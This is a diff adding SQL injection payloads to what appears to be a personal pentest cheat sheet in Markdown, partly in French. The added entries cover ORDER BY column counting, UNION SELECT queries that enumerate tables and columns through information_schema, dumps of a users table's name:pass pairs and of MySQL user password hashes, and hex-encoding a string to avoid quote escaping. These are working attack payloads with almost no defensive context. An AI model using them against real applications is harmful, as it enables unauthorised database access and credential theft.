@@ -68,6 +68,15 @@ Unless php tuned for
 </IfModule>
 ````
 
+### Identify number of fields in select
+
+```
+id=engineer order by 10-- throws an error
+id=engineer order by 9-- throws an error
+id=engineer order by 4-- ok => 4 field
+
+UNION SELECT 1,2,3,4
+```
 
 
 ### Use Union
@@ -84,6 +93,36 @@ Identify number of fields in select: here 1,2,3,4 doesn’t generate error
 ```
 name=a&pass=admin' or 1=1 UNION SELECT 1,2
 name=a&pass=admin' or 1=1 UNION SELECT table_name,table_name FROM information_schema.tables; -- -  
+```
+
+
+### Get table column names
+
+
+```
+name=a&pass=admin' or 1=1 UNION SELECT column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -
+
+```
+
+### dump table 
+```
+name=a&pass=admin' or 1=1 UNION SELECT concat(name,':',pass),1 FROM users; -- -
+```
+
+
+### Dump des users de mysql
+
+```
+name=a&pass=admin' or 1=1 UNION SELECT concat(User,':',Password),1 FROM user; -- -
+Internal Serever Error: Pas le droit..
+```
+
+#### Escape cotes
+
+hex-encoded value of “secret” better than messing with quotes. : table_schema='secret' => table_schema=0x736563726574
+
+```
+id=engineer union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=0x736563726574 --
 ```
 
 
